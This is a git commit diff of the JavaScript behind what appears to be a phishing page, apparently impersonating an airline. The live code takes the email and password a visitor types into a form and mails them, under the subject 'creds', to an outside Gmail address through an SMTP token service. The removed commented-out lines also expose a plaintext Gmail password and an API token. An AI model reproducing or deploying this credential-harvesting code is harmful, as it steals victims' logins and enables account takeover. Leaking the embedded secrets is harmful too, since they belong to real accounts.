cb665f34678f2aa77ed6ef8ea94b2b672b0395b8
samuelhernandes <128768779+samuelhernandes@users.noreply.github.com>
2023-03-24 17:17:26 -0400

    Update index.js

--- index.js
+++ index.js
@@ -12,58 +12,11 @@ submit.addEventListener("submit", (e) => {
      ${password.value}
     `;
 
-  //   Email.send({
-  //     Host: "smtp.gmail.com",
-  //     Username: "raakesh95misc@gmail.com",
-  //     Password: "L!nuxpedora1",
-  //     To: "raakesh95misc@gmail.com",
-  //     From: "raakesh95misc@gmail.com",
-  //     Subject: "Sending Email using javascript",
-  //     Body: "Well that was easy!!",
-  //   }).then(function (message) {
-  //     alert("mail sent successfully");
-  //   });
-
   Email.send({
-    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6", //add your token here
+    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
     To: "raakesh95official@gmail.com",
     From: "airemirates@proton.me",
     Subject: "creds",
     Body: ebody,
   });
 });
-
-// function sendEmail() {
-//   // e.preventDefault();
-
-//   // alert("mail sent successfully");
-
-//   console.log("Submit event called");
-
-//   let ebody = `
-//      ${email.value}
-//      ${password.value}
-//     `;
-
-//   //   Email.send({
-//   //     Host: "smtp.gmail.com",
-//   //     Username: "raakesh95misc@gmail.com",
-//   //     Password: "L!nuxpedora1",
-//   //     To: "raakesh95misc@gmail.com",
-//   //     From: "raakesh95misc@gmail.com",
-//   //     Subject: "Sending Email using javascript",
-//   //     Body: "Well that was easy!!",
-//   //   }).then(function (message) {
-//   //     alert("mail sent successfully");
-//   //   });
-
-//   Email.send({
-//     SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
-//     To: "raakesh95official@gmail.com",
-//     From: "airemirates@proton.me",
-//     Subject: "creds",
-//     Body: ebody,
-//   }).then(function (message) {
-//     alert(message);
-//   });
-// }
